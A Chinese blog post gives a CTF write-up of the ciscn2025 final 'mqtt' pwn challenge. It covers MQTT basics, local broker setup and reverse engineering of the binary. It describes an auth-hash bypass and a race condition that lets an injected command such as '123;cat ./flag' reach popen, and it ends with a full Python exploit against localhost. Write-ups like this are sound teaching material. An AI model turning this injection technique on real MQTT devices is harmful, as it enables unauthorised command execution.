---
title: mqtt-pwn小记
date: '2025-10-02 10:18:11'
updated: '2025-10-02 10:21:22'
permalink: posts/12.html
categories:
  - 知识分享
tags:
  - mqtt
---

## mqtt-pwn

MQTT（Message Queuing Telemetry Transport，消息队列遥测传输）协议，凭借其轻量、高效、可靠的特性，已成为**物联网（IoT）领域事实上的标准通信协议**。其应用范围已经渗透到智能家居、工业生产、车联网、智慧城市等各个角落，是支撑海量设备互联互通的关键技术。

在 `mqtt` 协议中有两个主要的交互角色：**broker** 、**client** 。

- **broker（代理/服务器）** ：可以理解为提供 mqtt 服务的代理服务器 ，通俗一点来讲就是"邮局"或者说是"消息中转中心"，每个 client 之间的通信都必须通过 `Broker` 来进行。

简单来说，Broker就是一个中间人，负责管理所有客户端的连接，并确保消息能够从一个客户端安全、高效地传递到另一个或多个客户端。

- **Client（客户端）** ：Client 是指任何连接到 Broker 的设备或应用程序 ，可以理解为"寄信人"和"收信人"。在物联网场景中，一个 `Client` 可以是一个温度传感器、一个智能灯泡、一部手机上的App，或者是一个在服务器上运行的数据分析程序。

一个`Client`可以扮演两种角色（或者同时扮演两种角色）：

**发布者 (Publisher):**

- **角色类比：寄信人。**
- **功能：** 负责产生数据和消息，并将这些指定topic的消息发送（**发布/Publish**）到 Broker。

**订阅者 (Subscriber):**

- **角色类比：收信人。**

- **功能：** 负责接收它感兴趣的消息。它会提前告诉Broker它对哪个"主题"（Topic）的消息感兴趣（这个行为叫做**订阅/Subscribe**），就会接收订阅相同topic的client。

## 环境搭建

1.使用安装 Mosquitto MQTT

```
sudo apt update
sudo apt install mosquitto mosquitto-clients
```

2.启动服务并设置开机自启

```
sudo systemctl enable mosquitto
sudo systemctl start mosquitto
```

3.测试服务

窗口1 订阅主题

```
mosquitto_sub -h localhost -t test/topic
```

窗口2 发布消息

```
mosquitto_pub -h localhost -t test/topic -m "Hello MQTT"
```

4.更改配置文件

```
sudo vim /etc/mosquitto/mosquitto.conf
#修改为如下内容
listener 9999 #设置监听端口为 9999
allow_anonymous true  # 可选，允许匿名访问（默认）
sudo systemctl restart mosquitto # 重启服务
```

5.安装paho-mqtt

```
pip3 install paho-mqtt
```

## 例题：**ciscn2025 final mqtt**

check一下：

![image-20250928113844431](/images/posts/202510021020738.png)

IDA：

![image-20250928112848587](/images/posts/202510021020202.png)

需要读取两个文件的内容，记得创建，要不然程序会miss file退出。

![image-20250928113941362](/images/posts/202510021020004.png)

`MQRRClient_create` 函数创造了一个客户端实例，初始化MQTT客户端所需的资源和结构。

` MQTTClient_setCallbacks` 设置回调函数 ，为客户端事件处理函数，中，`sub_1C8C` 是 **消息接收回调函数**。**当客户端收到订阅主题的消息时，就会执行这个函数**。`qword_5100` 是客户端的句柄或者是 ID 。

`MQTTClient_subscribe(qword_5100, "diag", 1LL)` 作用是订阅主题，一旦连接成功，客户端立即订阅名为 "diag" 的主题，使用 **QoS (服务质量) 等级 1**。这意味着所有发布到 `"diag"` 主题的消息都将被客户端接收。

这里查阅了一下资料，简单的扩展了一下关于 MQTT 的 Qos 等级的相关了解：

首先 MQTT 的机制提供了三种消息传递等级，用于**满足不同场景**的需求，分别被划分为 QoS 0、QoS 1、QoS 2 。

**QoS 0 - 最多交付一次**

QoS 0 是最低的服务质量等级，消息可能会丢失，但不会重复。消息发送后不需要确认或重传，传输效率高，延迟低。适用场景包括传感器数据、天气更新等**无需保证消息可靠性**的场景，尤其适合带宽有限的网络环境。

**QoS 1 - 至少交付一次**

QoS 1 确保消息至少被传递一次，但可能会重复。通过应答和重传机制，发送方在收到接收方的确认（PUBACK）后才认为消息成功传递。适用于**需要较高可靠性但允许消息重复**的场景，例如远程控制、状态更新等。需要注意的是，重复消息可能导致逻辑问题，因此需要在业务层面进行去重处理。

**QoS 2 - 只交付一次**

QoS 2 是最高的服务质量等级，确保消息既不丢失也不重复。通过四步握手（PUBLISH、PUBREC、PUBREL、PUBCOMP）机制，保证消息的唯一性。适用于**关键任务**场景，例如金融交易、远程医疗等。虽然可靠性最高，但传输开销和延迟也最大，适合带宽充足的网络环境。

等级由低到高，对于消息的可靠性愈加严苛。

**由于程序订阅了 `diag` 主题，所以我们可以通过发送该主题的消息，来让程序进行接收显示。**

#### 实验：

启动程序：

![image-20250928125552279](/images/posts/202510021020048.png)

另外一个终端发送数据：

```
mosquitto_pub -h localhost -p 9999 -t diag -m "Hello My name is SpaceDraG0n"
```

![image-20250928125626724](/images/posts/202510021020094.png)

成功接收：

![image-20250928125659040](/images/posts/202510021020684.png)

如果我们发送的数据不是 `diag` 主题的：

![image-20250928125755854](/images/posts/202510021020386.png)

程序客户端没有接收到任何消息：

![image-20250928125947189](/images/posts/202510021020195.png)

这就是 MQTT 协议的特性 。

继续往下看：

`pthread_create(&newthread, 0LL, sub_1E1A, 0LL)` 这里创建了一个线程

![image-20250928130048870](/images/posts/202510021020325.png)

新线程执行了一个函数：

![image-20250928130315192](/images/posts/202510021020988.png)

不断打印 MQTT 的 VIN 以及 status ，这里可以不用太在意，没有什么作用。

我们进入消息接收回调函数 `sub_1C8C` 看看，像是我们刚刚发送了一个 `diag` 主题的消息给客户端时，回调函数就会执行这个消息接收回调函数 ，来处理接收的消息。

![image-20250928143339775](/images/posts/202510021020922.png)

这里首先就是显示接收了该主题的消息，并将其打印出来

JSON 用于 JavaScript，把任何 JavaScript 对象变成 JSON，即把这个对象序列化成一个 JSON 格式的字符串，然后通过网络传递给其他计算机 。

JSON 格式的字符串由双引号 "" 包裹，由键值对组成，键和值之间用 : 分隔，值可以是字符串、数字、布尔、null、数组或对象等类型，例如：`{ "name": "Apifox" }` 。

```
CJSON_PUBLIC(cJSON *) cJSON_ParseWithLength(const char *value, size_t buffer_length);  
//和 cJSON_Parse没有太大区别，其内部也要计算json字符串的长度
```

`cJSON_ParseWithLength` 函数使用一个已知的长度来解析JSON ，并且返回一个指向 cJSON 结构体的指针。

```
CJSON_PUBLIC(cJSON *) cJSON_GetObjectItem(const cJSON * const object, const char * const string);
如果想直接通过键名的方式获得键值，可以通过此方法。定位到想要的键名的层次之后，调用此函数即可。（注意，输入的键名是不区分大小写的，也就是说cJSON_GetObjectItem(root, "name")和cJSON_GetObjectItem(root, "NAME")）是一样的。要是想要区分大小写，请使用cJSON_GetObjectItemCaseSensitive函数，使用方法跟cJSON_GetObjectItem一致
```

这里分别调用了三次 `cJSON_GetObjectItem` 函数 ，作用是解析 json 数据 ：

![image-20250928152452977](/images/posts/202510021021544.png)

查看汇编代码可以发现，从JSON对象（v10）中获取的三个 `item` （键值对） 的 "值" ，其中键分别是 "auth" ，"cmd" ，"arg" 。

然后又连续调用了三次 `strcpy` 函数 ，把取出来的值依次存储到指定变量内 。

接着又调用了`pthread_create函数` 再次创建一个新进程，用来处理 json 解析之后的数据 ，也就是我们取出来的值。

![image-20250928152919598](/images/posts/202510021021478.png)

进入新进程函数，发现在函数开头有一个 `sub_160E` 函数，这是一个检查：

![image-20250928152952733](/images/posts/202510021021931.png)

就是比较 dest （其实就是/mnt/VIN内的值）在经过 `sub_1509` 函数处理之后 ，放入 s2 数据是否与我们的`auth` 相一致，这里的 `auth` 就是我们使用 json 解析出来的其中一个值 ，如果不一致的话，这个进程就会打印 unauthorized ，然后进程直接结束 ，所以我们需要想办法绕过 。

![image-20250928154030486](/images/posts/202510021021895.png)

观察一下这个函数 ，对 dest 进行了一个简单的加密 ，然后将其转化成宽度为8，用 0 补齐的十六进制数据，并且存储在 a2 里面 ，也就是我们前面所说的 s2 ，所以我们只要写一个逆向，来使我们输入的值经过加密之后使其还是与 dest 一致，这样就能绕过这个验证 。

```
for ch in vin:
	auth = auth*31 + ord(ch)
auth = hex(auth)[-8:]
```

![image-20250928155430707](/images/posts/202510021021445.png)

绕过验证之后就会根据 cmd 来执行相应的命令 。

![image-20250928155528700](/images/posts/202510021021826.png)

其中我们这个程序的主要漏洞主要出现在这里 ，这个 sleep 函数为条件竞争创建了条件 ，因为该回调函数是通过线程创建，然后 arg 参数又是全局变量，也就是说，我们可以通过该线程 sleep 的时候 ，再次发送该主题的消息，启动另外一个接收回调函数，然后我们就可以修改 arg 为我们想要的指令，第一个线程 sleep 完后，就会通过 popen 函数来执行我们输入的指令 ，实现命令注入 。

```
FILE * popen( const char * command,const char * type);
```

关于 popen 函数 ，这里也简单扩展一下知识点，首先 popen 函数会调用 fork() 产生子进程 ，然后从子进程中调用 /bin/sh -c 来执行 command 的指令· ，参数 type 可以使用 `r`,`w` ，如果 type 为 r，那么调用进程读进 command 的标准输出 ，如果 type 为 w，那么调用进程写到 command 的标准输入。

若成功则返回**文件指针**，否则返回NULL，错误原因存于errno中。

```
#include<stdio.h>
 
void main()
{
    FILE *fp;
    char buffer[80];
    fp = popen("cat /etc/passwd", "r");
    fgets(buffer, sizeof(buffer), fp);
    printf("%s", buffer);
    pclose(fp);
}
```

言归正传，当然程序这里对arg参数也有一个函数进行检测：

![image-20250928171147871](/images/posts/202510021021229.png)

首先就是对参数的长度有检查 ，然后出现了一个 `__ctype_b_loc()` 函数 ，有一点看不懂 ，查阅一下资料。

`__ctype_b_loc` 函数为其自己实现的，主要获取一个数组列表，可容纳-128~255范围的字符，对应字符值索引可获取到本地语言的字符集，对于要求的字符与掩码位求与即可得到该字符是否为某种掩码位类型的字符 。

这个 `8` 在这里就是一个**位掩码** ，在标准的 `ctype` 实现中 ，代表数字 **(`_ISdigit`)** 的标志位就是第 3 位，其值为 2 的三次方 ，也就是 8 。如果一个字符是数字，那么它的属性掩码中代表 `_ISdigit` 的那一位就是 1 。当这个属性掩码与 `8` (二进制 `00001000`) 进行按位与操作时，如果该字符是数字，结果就是 `8` (非零)， 如果该字符不是数字，那么 `_ISdigit` 位就是 `0`，按位与的结果就是 `0`。

所以这里就是判断 arg 字符串中的每一个字符是不是都是由阿拉伯数字构成的 ，如果不是则结束进程 ，不再执行命令。

弄清楚上面的一些步骤我们就可以开始写 EXP 了

![image-20250930171547200](/images/posts/202510021021082.png)

记得订阅 diag/resp ，因为我们使用命令注入后的输出就会通过 "diag/resp" 主题的消息发送到各个客户端

#### EXP：

```
from pwn import *
import time
import paho.mqtt.client as mqtt
import json

context(log_level = "debug",os = "linux",arch = "amd64")
p = remote('127.0.0.1',9999)

def on_connect(client, userdata, flags, rc):
    client.subscribe("diag")
    client.subscribe("diag/resp")
    print("Connected with result code " + str(rc))

def on_subscribe(client,userdata,mid,granted_qos):
    print("消息发送成功")

def publish(client,topic,auth,cmd,arg):
    msg = {
        "auth":auth,
        "cmd":cmd,
        "arg":arg
    }
    result = client.publish(topic = topic, payload = json.dumps(msg))
    print(json.dumps(msg))
    print(result)
    return result

def on_message(client, userdata, msg):
    message = msg.payload.decode()# Decode message payload
    print(f"Received message on topic '{msg.topic}': {message}")
    print(message)

vin = "test"
auth = 0
for ch in vin:
	auth = auth*31 + ord(ch)
auth = hex(auth)[-6:].rjust(8,"0")

topic = "diag"
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.on_subscribe = on_subscribe
client.connect(host = "127.0.0.1",port = 9999,keepalive=10000)

publish(client,"diag",auth,"set_vin","12345678910")
sleep(0.5)
publish(client,"diag",auth,"set_vin","123;cat ./flag")
publish(client,"diag",auth,"set_vin","123;cat ./flag")

sleep(1)

client.loop_start()

p.interactive()
```

![image-20250930171505401](/images/posts/202510021021049.png)

![image-20250930171314971](/images/posts/202510021021848.png)



**参考链接：**

[[原创\]mqtt 协议pwn入门（ciscn2025 final mqtt）-Pwn-看雪论坛-安全社区|非营利性质技术交流社区](https://bbs.kanxue.com/thread-287727.htm)

[国赛 决赛 2025 - mqtt | RocketDevlog](https://rocketma.dev/2025/07/19/final.mqtt/)

 [cJSON使用文档——超详细_cjson getitem-CSDN博客](https://blog.csdn.net/qq_44647223/article/details/113682631)

[(16 封私信 / 80 条消息) 什么是 JSON：深入解析什么是JSON及其功能 - 知乎](https://zhuanlan.zhihu.com/p/644753810)

[Linux C popen()函数详解 - 52php - 博客园](https://www.cnblogs.com/52php/p/5722238.html)

[C 标准库系列之ctype.h - 浩月星空 - 博客园](https://www.cnblogs.com/haomiao/p/6128459.html)

